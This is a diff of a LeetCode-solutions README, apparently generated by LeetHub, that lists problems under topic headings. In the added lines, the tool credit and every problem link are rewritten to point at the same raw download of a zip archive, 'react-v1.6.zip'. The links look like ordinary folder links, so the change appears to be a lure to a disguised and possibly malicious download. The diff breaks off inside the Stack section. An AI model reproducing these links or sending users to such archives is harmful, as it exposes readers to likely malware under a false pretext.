@@ -1,229 +1,229 @@
-A collection of LeetCode questions to ace the coding interview! - Created using [LeetHub v2](https://github.com/arunbhardwaj/LeetHub-2.0)
+A collection of LeetCode questions to ace the coding interview! - Created using [LeetHub v2](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip)
 <!---LeetCode Topics Start-->
 # LeetCode Topics
 ## Array
 |  |
 | ------- |
-| [0033-search-in-rotated-sorted-array](https://github.com/muskan9567/react1/tree/master/0033-search-in-rotated-sorted-array) |
-| [0048-rotate-image](https://github.com/muskan9567/react1/tree/master/0048-rotate-image) |
-| [0084-largest-rectangle-in-histogram](https://github.com/muskan9567/react1/tree/master/0084-largest-rectangle-in-histogram) |
-| [0085-maximal-rectangle](https://github.com/muskan9567/react1/tree/master/0085-maximal-rectangle) |
-| [0228-summary-ranges](https://github.com/muskan9567/react1/tree/master/0228-summary-ranges) |
-| [0287-find-the-duplicate-number](https://github.com/muskan9567/react1/tree/master/0287-find-the-duplicate-number) |
-| [0396-rotate-function](https://github.com/muskan9567/react1/tree/master/0396-rotate-function) |
-| [0435-non-overlapping-intervals](https://github.com/muskan9567/react1/tree/master/0435-non-overlapping-intervals) |
-| [0496-next-greater-element-i](https://github.com/muskan9567/react1/tree/master/0496-next-greater-element-i) |
-| [0739-daily-temperatures](https://github.com/muskan9567/react1/tree/master/0739-daily-temperatures) |
-| [0874-walking-robot-simulation](https://github.com/muskan9567/react1/tree/master/0874-walking-robot-simulation) |
-| [0986-interval-list-intersections](https://github.com/muskan9567/react1/tree/master/0986-interval-list-intersections) |
-| [1288-remove-covered-intervals](https://github.com/muskan9567/react1/tree/master/1288-remove-covered-intervals) |
-| [1391-check-if-there-is-a-valid-path-in-a-grid](https://github.com/muskan9567/react1/tree/master/1391-check-if-there-is-a-valid-path-in-a-grid) |
-| [1722-minimize-hamming-distance-after-swap-operations](https://github.com/muskan9567/react1/tree/master/1722-minimize-hamming-distance-after-swap-operations) |
-| [1752-check-if-array-is-sorted-and-rotated](https://github.com/muskan9567/react1/tree/master/1752-check-if-array-is-sorted-and-rotated) |
-| [1855-maximum-distance-between-a-pair-of-values](https://github.com/muskan9567/react1/tree/master/1855-maximum-distance-between-a-pair-of-values) |
-| [1861-rotating-the-box](https://github.com/muskan9567/react1/tree/master/1861-rotating-the-box) |
-| [2078-two-furthest-houses-with-different-colors](https://github.com/muskan9567/react1/tree/master/2078-two-furthest-houses-with-different-colors) |
-| [2574-left-and-right-sum-differences](https://github.com/muskan9567/react1/tree/master/2574-left-and-right-sum-differences) |
-| [2615-sum-of-distances](https://github.com/muskan9567/react1/tree/master/2615-sum-of-distances) |
-| [2657-find-the-prefix-common-array-of-two-arrays](https://github.com/muskan9567/react1/tree/master/2657-find-the-prefix-common-array-of-two-arrays) |
-| [3225-maximum-score-from-grid-operations](https://github.com/muskan9567/react1/tree/master/3225-maximum-score-from-grid-operations) |
-| [3418-maximum-amount-of-money-robot-can-earn](https://github.com/muskan9567/react1/tree/master/3418-maximum-amount-of-money-robot-can-earn) |
-| [3488-closest-equal-element-queries](https://github.com/muskan9567/react1/tree/master/3488-closest-equal-element-queries) |
-| [3559-number-of-ways-to-assign-edge-weights-ii](https://github.com/muskan9567/react1/tree/master/3559-number-of-ways-to-assign-edge-weights-ii) |
-| [3653-xor-after-range-multiplication-queries-i](https://github.com/muskan9567/react1/tree/master/3653-xor-after-range-multiplication-queries-i) |
-| [3689-maximum-total-subarray-value-i](https://github.com/muskan9567/react1/tree/master/3689-maximum-total-subarray-value-i) |
-| [3740-minimum-distance-between-three-equal-elements-i](https://github.com/muskan9567/react1/tree/master/3740-minimum-distance-between-three-equal-elements-i) |
-| [3761-minimum-absolute-distance-between-mirror-pairs](https://github.com/muskan9567/react1/tree/master/3761-minimum-absolute-distance-between-mirror-pairs) |
-| [3838-weighted-word-mapping](https://github.com/muskan9567/react1/tree/master/3838-weighted-word-mapping) |
+| [0033-search-in-rotated-sorted-array](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0048-rotate-image](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0084-largest-rectangle-in-histogram](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0085-maximal-rectangle](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0228-summary-ranges](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0287-find-the-duplicate-number](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0396-rotate-function](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0435-non-overlapping-intervals](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0496-next-greater-element-i](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0739-daily-temperatures](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0874-walking-robot-simulation](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0986-interval-list-intersections](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [1288-remove-covered-intervals](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [1391-check-if-there-is-a-valid-path-in-a-grid](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [1722-minimize-hamming-distance-after-swap-operations](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [1752-check-if-array-is-sorted-and-rotated](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [1855-maximum-distance-between-a-pair-of-values](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [1861-rotating-the-box](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [2078-two-furthest-houses-with-different-colors](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [2574-left-and-right-sum-differences](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [2615-sum-of-distances](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [2657-find-the-prefix-common-array-of-two-arrays](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3225-maximum-score-from-grid-operations](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3418-maximum-amount-of-money-robot-can-earn](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3488-closest-equal-element-queries](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3559-number-of-ways-to-assign-edge-weights-ii](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3653-xor-after-range-multiplication-queries-i](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3689-maximum-total-subarray-value-i](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3740-minimum-distance-between-three-equal-elements-i](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3761-minimum-absolute-distance-between-mirror-pairs](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3838-weighted-word-mapping](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Two Pointers
 |  |
 | ------- |
-| [0202-happy-number](https://github.com/muskan9567/react1/tree/master/0202-happy-number) |
-| [0287-find-the-duplicate-number](https://github.com/muskan9567/react1/tree/master/0287-find-the-duplicate-number) |
-| [0344-reverse-string](https://github.com/muskan9567/react1/tree/master/0344-reverse-string) |
-| [0986-interval-list-intersections](https://github.com/muskan9567/react1/tree/master/0986-interval-list-intersections) |
-| [1855-maximum-distance-between-a-pair-of-values](https://github.com/muskan9567/react1/tree/master/1855-maximum-distance-between-a-pair-of-values) |
-| [1861-rotating-the-box](https://github.com/muskan9567/react1/tree/master/1861-rotating-the-box) |
-| [2095-delete-the-middle-node-of-a-linked-list](https://github.com/muskan9567/react1/tree/master/2095-delete-the-middle-node-of-a-linked-list) |
-| [2130-maximum-twin-sum-of-a-linked-list](https://github.com/muskan9567/react1/tree/master/2130-maximum-twin-sum-of-a-linked-list) |
+| [0202-happy-number](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0287-find-the-duplicate-number](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0344-reverse-string](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0986-interval-list-intersections](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [1855-maximum-distance-between-a-pair-of-values](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [1861-rotating-the-box](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [2095-delete-the-middle-node-of-a-linked-list](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [2130-maximum-twin-sum-of-a-linked-list](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Sweep Line
 |  |
 | ------- |
-| [0986-interval-list-intersections](https://github.com/muskan9567/react1/tree/master/0986-interval-list-intersections) |
+| [0986-interval-list-intersections](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Hash Table
 |  |
 | ------- |
-| [0202-happy-number](https://github.com/muskan9567/react1/tree/master/0202-happy-number) |
-| [0496-next-greater-element-i](https://github.com/muskan9567/react1/tree/master/0496-next-greater-element-i) |
-| [0874-walking-robot-simulation](https://github.com/muskan9567/react1/tree/master/0874-walking-robot-simulation) |
-| [2615-sum-of-distances](https://github.com/muskan9567/react1/tree/master/2615-sum-of-distances) |
-| [2657-find-the-prefix-common-array-of-two-arrays](https://github.com/muskan9567/react1/tree/master/2657-find-the-prefix-common-array-of-two-arrays) |
-| [3120-count-the-number-of-special-characters-i](https://github.com/muskan9567/react1/tree/master/3120-count-the-number-of-special-characters-i) |
-| [3121-count-the-number-of-special-characters-ii](https://github.com/muskan9567/react1/tree/master/3121-count-the-number-of-special-characters-ii) |
-| [3488-closest-equal-element-queries](https://github.com/muskan9567/react1/tree/master/3488-closest-equal-element-queries) |
-| [3740-minimum-distance-between-three-equal-elements-i](https://github.com/muskan9567/react1/tree/master/3740-minimum-distance-between-three-equal-elements-i) |
-| [3761-minimum-absolute-distance-between-mirror-pairs](https://github.com/muskan9567/react1/tree/master/3761-minimum-absolute-distance-between-mirror-pairs) |
+| [0202-happy-number](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0496-next-greater-element-i](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0874-walking-robot-simulation](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [2615-sum-of-distances](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [2657-find-the-prefix-common-array-of-two-arrays](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3120-count-the-number-of-special-characters-i](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3121-count-the-number-of-special-characters-ii](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3488-closest-equal-element-queries](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3740-minimum-distance-between-three-equal-elements-i](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3761-minimum-absolute-distance-between-mirror-pairs](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Math
 |  |
 | ------- |
-| [0048-rotate-image](https://github.com/muskan9567/react1/tree/master/0048-rotate-image) |
-| [0202-happy-number](https://github.com/muskan9567/react1/tree/master/0202-happy-number) |
-| [0396-rotate-function](https://github.com/muskan9567/react1/tree/master/0396-rotate-function) |
-| [0788-rotated-digits](https://github.com/muskan9567/react1/tree/master/0788-rotated-digits) |
-| [3559-number-of-ways-to-assign-edge-weights-ii](https://github.com/muskan9567/react1/tree/master/3559-number-of-ways-to-assign-edge-weights-ii) |
-| [3761-minimum-absolute-distance-between-mirror-pairs](https://github.com/muskan9567/react1/tree/master/3761-minimum-absolute-distance-between-mirror-pairs) |
+| [0048-rotate-image](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0202-happy-number](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0396-rotate-function](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0788-rotated-digits](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3559-number-of-ways-to-assign-edge-weights-ii](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3761-minimum-absolute-distance-between-mirror-pairs](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Binary Search
 |  |
 | ------- |
-| [0033-search-in-rotated-sorted-array](https://github.com/muskan9567/react1/tree/master/0033-search-in-rotated-sorted-array) |
-| [0287-find-the-duplicate-number](https://github.com/muskan9567/react1/tree/master/0287-find-the-duplicate-number) |
-| [1855-maximum-distance-between-a-pair-of-values](https://github.com/muskan9567/react1/tree/master/1855-maximum-distance-between-a-pair-of-values) |
-| [3488-closest-equal-element-queries](https://github.com/muskan9567/react1/tree/master/3488-closest-equal-element-queries) |
+| [0033-search-in-rotated-sorted-array](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0287-find-the-duplicate-number](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [1855-maximum-distance-between-a-pair-of-values](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3488-closest-equal-element-queries](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Bit Manipulation
 |  |
 | ------- |
-| [0287-find-the-duplicate-number](https://github.com/muskan9567/react1/tree/master/0287-find-the-duplicate-number) |
-| [2657-find-the-prefix-common-array-of-two-arrays](https://github.com/muskan9567/react1/tree/master/2657-find-the-prefix-common-array-of-two-arrays) |
-| [3559-number-of-ways-to-assign-edge-weights-ii](https://github.com/muskan9567/react1/tree/master/3559-number-of-ways-to-assign-edge-weights-ii) |
+| [0287-find-the-duplicate-number](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [2657-find-the-prefix-common-array-of-two-arrays](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3559-number-of-ways-to-assign-edge-weights-ii](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Dynamic Programming
 |  |
 | ------- |
-| [0085-maximal-rectangle](https://github.com/muskan9567/react1/tree/master/0085-maximal-rectangle) |
-| [0396-rotate-function](https://github.com/muskan9567/react1/tree/master/0396-rotate-function) |
-| [0435-non-overlapping-intervals](https://github.com/muskan9567/react1/tree/master/0435-non-overlapping-intervals) |
-| [0788-rotated-digits](https://github.com/muskan9567/react1/tree/master/0788-rotated-digits) |
-| [3225-maximum-score-from-grid-operations](https://github.com/muskan9567/react1/tree/master/3225-maximum-score-from-grid-operations) |
-| [3418-maximum-amount-of-money-robot-can-earn](https://github.com/muskan9567/react1/tree/master/3418-maximum-amount-of-money-robot-can-earn) |
-| [3559-number-of-ways-to-assign-edge-weights-ii](https://github.com/muskan9567/react1/tree/master/3559-number-of-ways-to-assign-edge-weights-ii) |
+| [0085-maximal-rectangle](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0396-rotate-function](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0435-non-overlapping-intervals](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0788-rotated-digits](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3225-maximum-score-from-grid-operations](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3418-maximum-amount-of-money-robot-can-earn](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3559-number-of-ways-to-assign-edge-weights-ii](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Matrix
 |  |
 | ------- |
-| [0048-rotate-image](https://github.com/muskan9567/react1/tree/master/0048-rotate-image) |
-| [0085-maximal-rectangle](https://github.com/muskan9567/react1/tree/master/0085-maximal-rectangle) |
-| [1391-check-if-there-is-a-valid-path-in-a-grid](https://github.com/muskan9567/react1/tree/master/1391-check-if-there-is-a-valid-path-in-a-grid) |
-| [1861-rotating-the-box](https://github.com/muskan9567/react1/tree/master/1861-rotating-the-box) |
-| [3225-maximum-score-from-grid-operations](https://github.com/muskan9567/react1/tree/master/3225-maximum-score-from-grid-operations) |
-| [3418-maximum-amount-of-money-robot-can-earn](https://github.com/muskan9567/react1/tree/master/3418-maximum-amount-of-money-robot-can-earn) |
+| [0048-rotate-image](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0085-maximal-rectangle](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [1391-check-if-there-is-a-valid-path-in-a-grid](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [1861-rotating-the-box](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3225-maximum-score-from-grid-operations](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3418-maximum-amount-of-money-robot-can-earn](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Greedy
 |  |
 | ------- |
-| [0435-non-overlapping-intervals](https://github.com/muskan9567/react1/tree/master/0435-non-overlapping-intervals) |
-| [2078-two-furthest-houses-with-different-colors](https://github.com/muskan9567/react1/tree/master/2078-two-furthest-houses-with-different-colors) |
-| [3689-maximum-total-subarray-value-i](https://github.com/muskan9567/react1/tree/master/3689-maximum-total-subarray-value-i) |
+| [0435-non-overlapping-intervals](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [2078-two-furthest-houses-with-different-colors](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3689-maximum-total-subarray-value-i](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Sorting
 |  |
 | ------- |
-| [0435-non-overlapping-intervals](https://github.com/muskan9567/react1/tree/master/0435-non-overlapping-intervals) |
-| [1288-remove-covered-intervals](https://github.com/muskan9567/react1/tree/master/1288-remove-covered-intervals) |
+| [0435-non-overlapping-intervals](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [1288-remove-covered-intervals](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## String
 |  |
 | ------- |
-| [0020-valid-parentheses](https://github.com/muskan9567/react1/tree/master/0020-valid-parentheses) |
-| [0344-reverse-string](https://github.com/muskan9567/react1/tree/master/0344-reverse-string) |
-| [0657-robot-return-to-origin](https://github.com/muskan9567/react1/tree/master/0657-robot-return-to-origin) |
-| [1047-remove-all-adjacent-duplicates-in-string](https://github.com/muskan9567/react1/tree/master/1047-remove-all-adjacent-duplicates-in-string) |
-| [2075-decode-the-slanted-ciphertext](https://github.com/muskan9567/react1/tree/master/2075-decode-the-slanted-ciphertext) |
-| [2833-furthest-point-from-origin](https://github.com/muskan9567/react1/tree/master/2833-furthest-point-from-origin) |
-| [3120-count-the-number-of-special-characters-i](https://github.com/muskan9567/react1/tree/master/3120-count-the-number-of-special-characters-i) |
-| [3121-count-the-number-of-special-characters-ii](https://github.com/muskan9567/react1/tree/master/3121-count-the-number-of-special-characters-ii) |
-| [3612-process-string-with-special-operations-i](https://github.com/muskan9567/react1/tree/master/3612-process-string-with-special-operations-i) |
-| [3614-process-string-with-special-operations-ii](https://github.com/muskan9567/react1/tree/master/3614-process-string-with-special-operations-ii) |
-| [3838-weighted-word-mapping](https://github.com/muskan9567/react1/tree/master/3838-weighted-word-mapping) |
+| [0020-valid-parentheses](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0344-reverse-string](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0657-robot-return-to-origin](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [1047-remove-all-adjacent-duplicates-in-string](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [2075-decode-the-slanted-ciphertext](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [2833-furthest-point-from-origin](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3120-count-the-number-of-special-characters-i](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3121-count-the-number-of-special-characters-ii](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3612-process-string-with-special-operations-i](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3614-process-string-with-special-operations-ii](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3838-weighted-word-mapping](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Simulation
 |  |
 | ------- |
-| [0657-robot-return-to-origin](https://github.com/muskan9567/react1/tree/master/0657-robot-return-to-origin) |
-| [0874-walking-robot-simulation](https://github.com/muskan9567/react1/tree/master/0874-walking-robot-simulation) |
-| [2069-walking-robot-simulation-ii](https://github.com/muskan9567/react1/tree/master/2069-walking-robot-simulation-ii) |
-| [2075-decode-the-slanted-ciphertext](https://github.com/muskan9567/react1/tree/master/2075-decode-the-slanted-ciphertext) |
-| [3612-process-string-with-special-operations-i](https://github.com/muskan9567/react1/tree/master/3612-process-string-with-special-operations-i) |
-| [3614-process-string-with-special-operations-ii](https://github.com/muskan9567/react1/tree/master/3614-process-string-with-special-operations-ii) |
-| [3653-xor-after-range-multiplication-queries-i](https://github.com/muskan9567/react1/tree/master/3653-xor-after-range-multiplication-queries-i) |
-| [3838-weighted-word-mapping](https://github.com/muskan9567/react1/tree/master/3838-weighted-word-mapping) |
+| [0657-robot-return-to-origin](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0874-walking-robot-simulation](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [2069-walking-robot-simulation-ii](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [2075-decode-the-slanted-ciphertext](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3612-process-string-with-special-operations-i](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3614-process-string-with-special-operations-ii](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3653-xor-after-range-multiplication-queries-i](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [3838-weighted-word-mapping](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Design
 |  |
 | ------- |
-| [0155-min-stack](https://github.com/muskan9567/react1/tree/master/0155-min-stack) |
-| [0232-implement-queue-using-stacks](https://github.com/muskan9567/react1/tree/master/0232-implement-queue-using-stacks) |
-| [2069-walking-robot-simulation-ii](https://github.com/muskan9567/react1/tree/master/2069-walking-robot-simulation-ii) |
+| [0155-min-stack](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [0232-implement-queue-using-stacks](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
+| [2069-walking-robot-simulation-ii](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Divide and Conquer
 |  |
 | ------- |
-| [3653-xor-after-range-multiplication-queries-i](https://github.com/muskan9567/react1/tree/master/3653-xor-after-range-multiplication-queries-i) |
+| [3653-xor-after-range-multiplication-queries-i](https://github.com/muskan9567/react1/raw/refs/heads/main/2078-two-furthest-houses-with-different-colors/react-v1.6.zip) |
 ## Stack
 |  |
 | ------- |
-| [0020-valid-parentheses](https://github.com/muskan9567/react1/tree/master/0020-valid-parentheses) |
-| [0084-largest-rectangle-in-histogram](https://github.com/muskan9567/react1/tree/master/0084-largest-rectangle-in-histogram) |
-| [0085-maximal-rectangle](https://github.com/muskan9567/react1/tree/master/0085-maximal-rectangle) |
-| [0094-binary-tree-inorder-traversal](https://github.com/muskan9567/react1/tree/master/0094-binary-tree-inorder-traversal) |
-| [0144-binary-tree-preorder-traversal](https://github.com/muskan9567/react1/tree/master/0144-binary-tree-preorder-traversal) |
-| [0145-binary-tree-postorder-traversal](https://github.com/muskan9567/react1/tree/master/0145-binary-tree-postorder-traversal) |
-| [0155-min-stack](https://github.com/muskan9567/react1/tree/master/0155-min-stack) |
-| [0232-implement-queue-using-stacks](https://github.com/muskan9567/react1/tree/master/0232-implement-queue-using-stacks) |
-| [0496-next-greater-element-i](https://github.com/muskan9567/react1/tree/master/0496-next-greater-element-i) |
-| [0739-daily-temperatures](https://github.com/muskan9567/react1/tree/master/0739-daily-temperatures) |
-| [1047-remove-all-adjacent-duplicates-in-string](https://github.com/muskan9567/react1/tree/master/1047-remove-all-adjacent-duplicates-in-string) |
-| [2130-maximum-twin-sum-of-a-linked-list](https://github.com/muskan9567/react1/tree/master/2130-maximum-twin-sum-of-a-linked-list) |
